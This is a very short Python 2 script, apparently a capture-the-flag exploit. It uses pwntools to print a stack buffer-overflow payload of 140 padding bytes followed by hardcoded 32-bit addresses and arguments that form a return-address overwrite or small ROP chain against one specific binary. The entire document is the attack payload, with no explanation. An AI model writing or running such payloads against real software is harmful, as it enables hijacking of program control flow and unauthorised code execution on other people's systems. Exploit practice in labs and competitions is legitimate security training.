from pwn import *

print "A"*140 + p32(0x8048894) + p32(0x806d2a0) + p32(0x804ede0) + p32(0x3) + p32(0xffffd390) + p32(0x100)
